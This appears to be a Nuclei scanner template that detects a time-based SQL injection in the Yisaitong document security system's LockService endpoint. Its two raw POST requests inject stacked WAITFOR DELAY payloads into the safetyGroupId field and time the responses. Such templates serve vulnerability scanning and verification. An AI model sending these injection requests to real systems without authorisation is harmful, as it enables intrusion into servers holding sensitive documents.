id: yisaitong-CDG-LockService-sql-time

info:
  name: 亿赛通电子文档安全管理系统 LockService SQL注入漏洞
  author: yisaitong
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=AddLockToSafetyGroup&safetyGroupId=123'%3bWAITFOR+DELAY+'0%3a0%3a4'--&fromurl=/client/clientList.jsp&lockKeyId=1
      - |
        POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=AddLockToSafetyGroup&safetyGroupId=123'%3bWAITFOR+DELAY+'0%3a0%3a8'--&fromurl=/client/clientList.jsp&lockKeyId=1
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and